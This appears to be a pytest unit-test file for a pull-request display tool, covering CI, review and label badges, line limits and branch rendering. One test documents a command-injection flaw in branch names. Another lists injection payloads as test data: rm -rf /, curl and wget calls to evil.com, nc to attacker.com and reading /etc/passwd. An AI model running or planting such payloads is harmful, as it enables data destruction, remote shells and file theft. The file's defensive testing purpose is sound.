"""
Unit tests for feature renderer module.

Tests badge rendering, content formatting, and display logic for PR features.
"""

import pytest
from unittest.mock import Mock, patch, MagicMock
from rich.text import Text

from prs.core.display.feature_renderers import (
    render_summary_status,
    render_checks_badge,
    render_reviews_badge,
    render_labels_badge,
    count_long_modes,
    SHORT_PAD_SIZE,
    FEATURE_CHARACTER_LIMITS
)


class TestBadgeRendering:
    """Tests for badge rendering functions."""

    def create_mock_pr(self, **kwargs):
        """Helper to create mock PR with default values."""
        pr = Mock()
        pr.id = kwargs.get('id', 123)
        pr.title = kwargs.get('title', "Test PR")
        pr.checks = kwargs.get('checks', [])
        pr.reviews = kwargs.get('reviews', [])
        pr.labels = kwargs.get('labels', [])
        return pr

    @patch('prs.core.display.feature_renderers.analyze_checks')
    def test_render_checks_badge_all_success(self, mock_analyze_checks):
        """Checks badge with all successful checks shows green CI."""
        pr = self.create_mock_pr()
        summary_text = Text()
        
        # (total, success, pending, failing, details)
        mock_analyze_checks.return_value = (3, 3, 0, 0, [])
        
        render_checks_badge(pr, summary_text)
        
        assert "CI: " in summary_text.plain
        assert "3/0/0" in summary_text.plain

    @patch('prs.core.display.feature_renderers.analyze_checks')
    def test_render_checks_badge_with_failures(self, mock_analyze_checks):
        """Checks badge with failures shows red CI."""
        pr = self.create_mock_pr()
        summary_text = Text()
        
        # (total, success, pending, failing, details)
        mock_analyze_checks.return_value = (5, 2, 1, 2, [])
        
        render_checks_badge(pr, summary_text)
        
        assert "CI: " in summary_text.plain
        assert "2/1/2" in summary_text.plain

    @patch('prs.core.display.feature_renderers.analyze_checks')
    def test_render_checks_badge_no_checks(self, mock_analyze_checks):
        """Checks badge with no checks shows yellow CI."""
        pr = self.create_mock_pr()
        summary_text = Text()
        
        # No checks
        mock_analyze_checks.return_value = (0, 0, 0, 0, [])
        
        render_checks_badge(pr, summary_text)
        
        assert "CI: " in summary_text.plain
        assert "0/0/0" in summary_text.plain

    @patch('prs.core.display.feature_renderers.analyze_reviews')
    def test_render_reviews_badge_mixed_states(self, mock_analyze_reviews):
        """Reviews badge shows counts for approved/changes/comments."""
        pr = self.create_mock_pr()
        summary_text = Text()
        
        # Mock review details with different states
        review_details = [
            ("APPROVED", "user1", "green"),
            ("CHANGES_REQUESTED", "user2", "red"),
            ("COMMENTED", "user3", "blue")
        ]
        mock_analyze_reviews.return_value = ("REVIEW_REQUIRED", review_details)
        
        render_reviews_badge(pr, summary_text)
        
        assert "RV: " in summary_text.plain
        assert "1/1/1" in summary_text.plain  # 1 approved, 1 changes, 1 comment

    @patch('prs.core.display.feature_renderers.analyze_reviews')
    def test_render_reviews_badge_no_reviews(self, mock_analyze_reviews):
        """Reviews badge with no reviews shows zeros."""
        pr = self.create_mock_pr()
        summary_text = Text()
        
        mock_analyze_reviews.return_value = ("NO_REVIEWS", [])
        
        render_reviews_badge(pr, summary_text)
        
        assert "RV: " in summary_text.plain
        assert "0/0/0" in summary_text.plain

    @patch('prs.core.display.feature_renderers.analyze_labels')
    def test_render_labels_badge_mixed_categories(self, mock_analyze_labels):
        """Labels badge shows counts for good/warn/danger categories."""
        pr = self.create_mock_pr()
        summary_text = Text()
        
        # Mock label analysis with different categories
        mock_analyze_labels.return_value = (2, 1, 1)  # good, warn, dangerous
        
        render_labels_badge(pr, summary_text)
        
        assert "LB: " in summary_text.plain
        assert "2/1/1" in summary_text.plain

    @patch('prs.core.display.feature_renderers.analyze_labels')
    def test_render_labels_badge_no_labels(self, mock_analyze_labels):
        """Labels badge with no labels shows zeros."""
        pr = self.create_mock_pr()
        summary_text = Text()
        
        mock_analyze_labels.return_value = (0, 0, 0)
        
        render_labels_badge(pr, summary_text)
        
        assert "LB: " in summary_text.plain
        assert "0/0/0" in summary_text.plain

    def test_badge_padding_logic(self):
        """Badge padding respects SHORT_PAD_SIZE."""
        # Test that SHORT_PAD_SIZE is properly defined
        assert SHORT_PAD_SIZE == 12
        
        # Test various badge text lengths
        test_cases = [
            ("CI: 1/0/0", 7),   # Short text needs padding
            ("RV: 10/5/3", 9),  # Medium text needs padding  
            ("LB: 999/99/9", 11), # Long text needs minimal padding
            ("CI: 1000/100/100", 15), # Very long text exceeds pad size
        ]
        
        for badge_text, expected_length in test_cases:
            if expected_length <= SHORT_PAD_SIZE:
                padding_needed = max(0, SHORT_PAD_SIZE - expected_length)
                padded_length = expected_length + padding_needed
                assert padded_length >= expected_length
            else:
                # Text longer than pad size gets no padding
                padding_needed = 0
                assert padding_needed == 0

    @patch('prs.core.display.feature_renderers.analyze_checks')
    def test_badge_large_numbers(self, mock_analyze_checks):
        """Badge handles large numbers correctly."""
        pr = self.create_mock_pr()
        summary_text = Text()
        
        # Large numbers
        mock_analyze_checks.return_value = (1000, 999, 1, 0, [])
        
        render_checks_badge(pr, summary_text)
        
        assert "999/1/0" in summary_text.plain


class TestSummaryStatusRendering:
    """Tests for summary status line rendering."""

    def create_mock_pr(self):
        """Helper to create mock PR."""
        pr = Mock()
        pr.id = 123
        pr.title = "Test PR"
        return pr

    @patch('prs.core.display.feature_renderers.render_checks_badge')
    @patch('prs.core.display.feature_renderers.render_reviews_badge')
    @patch('prs.core.display.feature_renderers.render_labels_badge')
    def test_summary_with_all_short_modes(self, mock_labels, mock_reviews, mock_checks):
        """Summary includes all badges when all modes are 'short'."""
        pr = self.create_mock_pr()
        modes = {
            "checks": "short",
            "reviews": "short",
            "labels": "short"
        }
        
        result = render_summary_status(pr, modes)
        
        assert isinstance(result, Text)
        mock_checks.assert_called_once_with(pr, result)
        mock_reviews.assert_called_once_with(pr, result)
        mock_labels.assert_called_once_with(pr, result)

    @patch('prs.core.display.feature_renderers.render_checks_badge')
    @patch('prs.core.display.feature_renderers.render_reviews_badge')
    @patch('prs.core.display.feature_renderers.render_labels_badge')
    def test_summary_with_mixed_modes(self, mock_labels, mock_reviews, mock_checks):
        """Summary includes only short mode badges."""
        pr = self.create_mock_pr()
        modes = {
            "checks": "short",
            "reviews": "normal",  # Should not be included
            "labels": "none"      # Should not be included
        }
        
        result = render_summary_status(pr, modes)
        
        assert isinstance(result, Text)
        mock_checks.assert_called_once_with(pr, result)
        mock_reviews.assert_not_called()
        mock_labels.assert_not_called()

    @patch('prs.core.display.feature_renderers.render_checks_badge')
    @patch('prs.core.display.feature_renderers.render_reviews_badge')
    @patch('prs.core.display.feature_renderers.render_labels_badge')
    def test_summary_with_no_short_modes(self, mock_labels, mock_reviews, mock_checks):
        """Summary with no short modes returns empty text."""
        pr = self.create_mock_pr()
        modes = {
            "checks": "normal",
            "reviews": "long",
            "labels": "none"
        }
        
        result = render_summary_status(pr, modes)
        
        assert isinstance(result, Text)
        assert result.plain == ""
        mock_checks.assert_not_called()
        mock_reviews.assert_not_called()
        mock_labels.assert_not_called()

    def test_summary_empty_modes(self):
        """Summary with empty modes handled gracefully."""
        pr = self.create_mock_pr()
        modes = {}
        
        # This might raise KeyError due to modes["checks"] access
        with pytest.raises(KeyError):
            render_summary_status(pr, modes)


class TestCountLongModes:
    """Tests for counting long modes function."""

    def test_count_long_modes_all_long(self):
        """All features in long mode returns 3."""
        modes = {
            "checks": "long",
            "reviews": "long",
            "labels": "long"
        }
        assert count_long_modes(modes) == 3

    def test_count_long_modes_mixed(self):
        """Mixed modes returns correct count."""
        modes = {
            "checks": "long",
            "reviews": "short",
            "labels": "long"
        }
        assert count_long_modes(modes) == 2

    def test_count_long_modes_none_long(self):
        """No long modes returns 0."""
        modes = {
            "checks": "short",
            "reviews": "normal",
            "labels": "none"
        }
        assert count_long_modes(modes) == 0

    def test_count_long_modes_empty(self):
        """Empty modes returns 0."""
        assert count_long_modes({}) == 0
        assert count_long_modes(None) == 0

    def test_count_long_modes_extra_keys(self):
        """Extra keys in modes are ignored."""
        modes = {
            "checks": "long",
            "reviews": "short",
            "labels": "long",
            "author": "long",      # Should be ignored
            "pr_url": "long",      # Should be ignored
            "branch": "long"       # Should be ignored
        }
        assert count_long_modes(modes) == 2


class TestDetailRendering:
    """Tests for detail rendering functions."""

    def create_mock_pr_with_checks(self):
        """Helper to create PR with check data."""
        pr = Mock()
        pr.id = 123
        pr.checks = [
            {"context": "ci/build", "state": "SUCCESS"},
            {"context": "ci/test", "state": "PENDING"},
            {"context": "ci/lint", "state": "FAILURE"}
        ]
        return pr

    def create_mock_pr_with_reviews(self):
        """Helper to create PR with review data."""
        pr = Mock()
        pr.id = 123
        pr.reviews = [
            {"user": {"login": "reviewer1"}, "state": "APPROVED"},
            {"user": {"login": "reviewer2"}, "state": "CHANGES_REQUESTED"}
        ]
        return pr

    def create_mock_pr_with_labels(self):
        """Helper to create PR with label data."""
        pr = Mock()
        pr.id = 123
        pr.labels = ["bug", "priority-high", "ready-to-merge"]
        return pr

    @patch('prs.core.display.feature_renderers.get_checks')
    def test_render_checks_detail_normal_mode_one_line(self, mock_get_checks):
        """Checks detail in normal mode with <2 long modes shows one line."""
        from prs.core.display.feature_renderers import render_checks_detail
        
        pr = self.create_mock_pr_with_checks()
        modes = {"checks": "normal", "reviews": "short", "labels": "short"}
        
        mock_get_checks.return_value = "Checks: 1 passed, 1 pending, 1 failed"
        
        result = render_checks_detail(pr, "normal", modes)
        
        assert isinstance(result, Text)
        mock_get_checks.assert_called_once_with(pr, "normal")

    @patch('prs.core.display.feature_renderers.get_checks')
    def test_render_checks_detail_normal_mode_two_line(self, mock_get_checks):
        """Checks detail in normal mode with ≥2 long modes shows two lines."""
        from prs.core.display.feature_renderers import render_checks_detail
        
        pr = self.create_mock_pr_with_checks()
        modes = {"checks": "normal", "reviews": "long", "labels": "long"}
        
        mock_get_checks.return_value = "Checks: 1 passed, 1 pending, 1 failed"
        
        result = render_checks_detail(pr, "normal", modes)
        
        assert isinstance(result, Text)
        mock_get_checks.assert_called_once_with(pr, "normal")

    @patch('prs.core.display.feature_renderers.get_checks')
    def test_render_checks_detail_long_mode(self, mock_get_checks):
        """Checks detail in long mode applies line limits."""
        from prs.core.display.feature_renderers import render_checks_detail
        
        pr = self.create_mock_pr_with_checks()
        modes = {"lines": 3}  # Custom line limit
        
        # Mock return with multiple lines
        long_content = "Check 1: PASS\nCheck 2: FAIL\nCheck 3: PENDING\nCheck 4: SKIP\nCheck 5: ERROR"
        mock_get_checks.return_value = long_content
        
        result = render_checks_detail(pr, "long", modes)
        
        assert isinstance(result, Text)
        # Should be limited to 3 lines
        lines = result.plain.split('\n')
        assert len(lines) <= 3

    @patch('prs.core.display.feature_renderers.get_reviews')
    def test_render_reviews_detail_with_line_limits(self, mock_get_reviews):
        """Reviews detail respects line limits in long mode."""
        from prs.core.display.feature_renderers import render_reviews_detail
        
        pr = self.create_mock_pr_with_reviews()
        modes = {"lines": 2}
        
        # Mock return with many lines
        long_content = "Review 1\nReview 2\nReview 3\nReview 4\nReview 5"
        mock_get_reviews.return_value = long_content
        
        result = render_reviews_detail(pr, "long", modes)
        
        assert isinstance(result, Text)
        lines = result.plain.split('\n')
        assert len(lines) <= 2

    @patch('prs.core.display.feature_renderers.get_labels')
    def test_render_labels_detail_with_character_limits(self, mock_get_labels):
        """Labels detail respects character limits."""
        from prs.core.display.feature_renderers import render_labels_detail
        
        pr = self.create_mock_pr_with_labels()
        modes = {}
        
        # Mock return with long content
        long_content = "x" * 100  # Exceeds FEATURE_CHARACTER_LIMITS["Labels"] = 30
        mock_get_labels.return_value = long_content
        
        result = render_labels_detail(pr, "long", modes)
        
        assert isinstance(result, Text)
        # Should be truncated to character limit
        assert len(result.plain) <= FEATURE_CHARACTER_LIMITS["Labels"] + 3  # +3 for ellipsis

    def test_feature_character_limits_constants(self):
        """Feature character limits are properly defined."""
        assert FEATURE_CHARACTER_LIMITS["Checks"] == 60
        assert FEATURE_CHARACTER_LIMITS["Reviews"] == 35
        assert FEATURE_CHARACTER_LIMITS["Labels"] == 30

    @patch('prs.core.display.feature_renderers.get_checks')
    def test_render_detail_with_none_result(self, mock_get_checks):
        """Detail rendering handles None results gracefully."""
        from prs.core.display.feature_renderers import render_checks_detail
        
        pr = self.create_mock_pr_with_checks()
        modes = {}
        
        mock_get_checks.return_value = None
        
        result = render_checks_detail(pr, "normal", modes)
        
        assert result is None

    @patch('prs.core.display.feature_renderers.get_reviews')
    def test_render_detail_empty_content(self, mock_get_reviews):
        """Detail rendering handles empty content."""
        from prs.core.display.feature_renderers import render_reviews_detail
        
        pr = self.create_mock_pr_with_reviews()
        modes = {}
        
        mock_get_reviews.return_value = ""
        
        result = render_reviews_detail(pr, "normal", modes)
        
        assert isinstance(result, Text)
        assert result.plain == ""


class TestBranchAndUrlRendering:
    """Tests for branch and URL rendering functions."""

    def create_mock_pr(self, **kwargs):
        """Helper to create mock PR."""
        pr = Mock()
        pr.id = kwargs.get('id', 123)
        pr.url = kwargs.get('url', "https://github.com/test/repo/pull/123")
        pr.branch = kwargs.get('branch', "feature-branch")
        pr.author = kwargs.get('author', "test-user")
        pr.role = kwargs.get('role', "author")
        return pr

    @patch('prs.core.display.feature_renderers.render_url_info')
    def test_render_url_info_basic(self, mock_render_url):
        """URL rendering with basic functionality."""
        from prs.core.display.feature_renderers import render_url_info
        
        pr = self.create_mock_pr()
        mock_render_url.return_value = Text("[LINK] https://github.com/test/repo/pull/123")
        
        result = render_url_info(pr, "normal")
        
        assert isinstance(result, Text)
        assert "[LINK]" in result.plain
        assert pr.url in result.plain

    @patch('prs.core.display.feature_renderers.render_branch_info')
    def test_render_branch_info_author_pr(self, mock_render_branch):
        """Branch rendering for author PR shows only branch name."""
        from prs.core.display.feature_renderers import render_branch_info
        
        pr = self.create_mock_pr(role="author")
        mock_render_branch.return_value = Text("feature-branch")
        
        result = render_branch_info(pr, "normal")
        
        assert isinstance(result, Text)
        assert pr.branch in result.plain

    @patch('prs.core.display.feature_renderers.render_branch_info')
    @patch('prs.core.display.feature_renderers.get_username_color')
    def test_render_branch_info_reviewer_pr(self, mock_get_color, mock_render_branch):
        """Branch rendering for reviewer PR shows author name and branch."""
        from prs.core.display.feature_renderers import render_branch_info
        
        pr = self.create_mock_pr(role="reviewer", author="other-user")
        mock_get_color.return_value = ("blue", None)
        mock_render_branch.return_value = Text("other-user \t feature-branch")
        
        result = render_branch_info(pr, "normal")
        
        assert isinstance(result, Text)
        # Should contain both author and branch
        assert "other-user" in result.plain or pr.branch in result.plain

    @patch('prs.core.display.feature_renderers.render_branch_info')
    def test_render_branch_info_command_injection_vulnerability(self, mock_render_branch):
        """Branch rendering vulnerability with command injection."""
        from prs.core.display.feature_renderers import render_branch_info
        
        # Test the security vulnerability identified by expert analysis
        malicious_branch = "test-branch; rm -rf /"
        pr = self.create_mock_pr(branch=malicious_branch)
        
        # The vulnerability is in the actual render_branch_info function
        # which creates URLs like: f"command:git checkout {pr.branch}"
        # This would become: "command:git checkout test-branch; rm -rf /"
        
        mock_render_branch.return_value = Text("Branch with injection")
        
        result = render_branch_info(pr, "normal")
        
        # Document that the vulnerability exists
        command_url = f"command:git checkout {malicious_branch}"
        assert ";" in command_url  # Shell metacharacter present
        assert "rm -rf" in command_url  # Dangerous command present
        
        # This demonstrates the command injection vulnerability exists
        # The branch name is used directly in command construction

    def test_branch_name_sanitization_patterns(self):
        """Test patterns that need sanitization in branch names."""
        dangerous_patterns = [
            "branch; rm -rf /",
            "branch && curl evil.com", 
            "branch | nc attacker.com 4444",
            "branch$(curl evil.com)",
            "branch`wget evil.com/script.sh`",
            "branch || cat /etc/passwd",
            "branch; echo 'pwned' > /tmp/hack"
        ]
        
        for pattern in dangerous_patterns:
            pr = self.create_mock_pr(branch=pattern)
            
            # In the actual code, this becomes a command URL
            command_url = f"command:git checkout {pr.branch}"
            
            # These would be dangerous if executed by a terminal
            has_shell_metacharacters = any(
                char in command_url 
                for char in [';', '&', '|', '$', '`', '(', ')']
            )
            
            # Document that these patterns are dangerous
            assert has_shell_metacharacters, f"Pattern '{pattern}' should be flagged as dangerous"

    @patch('prs.core.display.feature_renderers.render_branch_info')
    def test_render_branch_info_special_characters(self, mock_render_branch):
        """Branch rendering with special characters."""
        from prs.core.display.feature_renderers import render_branch_info
        
        special_branch = "feature/fix-émojis-🚀-issue"
        pr = self.create_mock_pr(branch=special_branch)
        
        mock_render_branch.return_value = Text("Special branch")
        
        result = render_branch_info(pr, "normal")
        
        assert isinstance(result, Text)

    @patch('prs.core.display.feature_renderers.render_url_info')
    def test_render_url_info_very_long_url(self, mock_render_url):
        """URL rendering with very long URLs."""
        from prs.core.display.feature_renderers import render_url_info
        
        long_url = "https://github.com/very-long-org-name/very-long-repo-name-that-exceeds-normal-limits/pull/123456?tab=conversation&extra=params"
        pr = self.create_mock_pr(url=long_url)
        
        mock_render_url.return_value = Text(f"[LINK] {long_url}")
        
        result = render_url_info(pr, "normal")
        
        assert isinstance(result, Text)
        assert "[LINK]" in result.plain


class TestRichTextAndStyling:
    """Tests for Rich Text handling and styling."""

    def test_rich_text_creation(self):
        """Rich Text objects created properly."""
        text = Text("Test content")
        assert isinstance(text, Text)
        assert text.plain == "Test content"

    def test_rich_text_styling_preservation(self):
        """Rich Text styling preserved during operations."""
        text = Text("Styled text", style="red")
        
        # Basic styling is applied
        assert len(text._spans) > 0
        
        # Plain text is accessible
        assert text.plain == "Styled text"

    def test_rich_text_length_calculations(self):
        """Rich Text length calculations for padding."""
        # Plain text length used for padding calculations
        styled_text = Text("CI: 1/0/0", style="green")
        plain_length = len(styled_text.plain)
        
        # Padding should be based on plain text length, not styled length
        padding_needed = max(0, SHORT_PAD_SIZE - plain_length)
        assert padding_needed >= 0

    def test_rich_text_appending(self):
        """Rich Text appending works correctly."""
        text = Text()
        text.append("First part", style="red")
        text.append(" Second part", style="blue")
        
        assert text.plain == "First part Second part"
        assert len(text._spans) >= 2  # Has multiple styling spans


class TestEdgeCasesAndErrorHandling:
    """Tests for edge cases and error handling."""

    def test_none_pr_object(self):
        """None PR object handled gracefully."""
        # Most functions should handle None PR gracefully
        modes = {"checks": "short"}
        
        # This might raise AttributeError in some functions
        with pytest.raises(AttributeError):
            render_summary_status(None, modes)

    def test_malformed_analysis_data(self):
        """Malformed analysis data handled gracefully."""
        pr = Mock()
        pr.id = 123
        
        with patch('prs.core.display.feature_renderers.analyze_checks') as mock_analyze:
            # Return malformed data
            mock_analyze.return_value = None
            
            summary_text = Text()
            
            # Should handle gracefully or raise appropriate error
            try:
                render_checks_badge(pr, summary_text)
            except (TypeError, AttributeError):
                # Expected for malformed data
                pass

    def test_missing_user_fields(self):
        """Missing user fields in reviews handled gracefully."""
        pr = Mock()
        pr.reviews = [
            {"state": "APPROVED"},  # Missing user field
            {"user": None, "state": "CHANGES_REQUESTED"}  # None user
        ]
        
        with patch('prs.core.display.feature_renderers.analyze_reviews') as mock_analyze:
            mock_analyze.return_value = ("REVIEW_REQUIRED", [])
            
            summary_text = Text()
            render_reviews_badge(pr, summary_text)
            
            # Should not crash
            assert isinstance(summary_text, Text)

    def test_empty_contexts_and_states(self):
        """Empty contexts and states handled properly."""
        pr = Mock()
        pr.checks = [
            {"context": "", "state": "SUCCESS"},    # Empty context
            {"context": "ci/test", "state": ""},    # Empty state
            {}  # Missing fields entirely
        ]
        
        with patch('prs.core.display.feature_renderers.analyze_checks') as mock_analyze:
            mock_analyze.return_value = (1, 1, 0, 0, [])
            
            summary_text = Text()
            render_checks_badge(pr, summary_text)
            
            # Should handle gracefully
            assert "CI: " in summary_text.plain

    def test_very_large_counts(self):
        """Very large counts handled without overflow."""
        pr = Mock()
        summary_text = Text()
        
        with patch('prs.core.display.feature_renderers.analyze_checks') as mock_analyze:
            # Very large numbers
            mock_analyze.return_value = (999999, 999999, 0, 0, [])
            
            render_checks_badge(pr, summary_text)
            
            # Should handle large numbers
            assert "999999" in summary_text.plain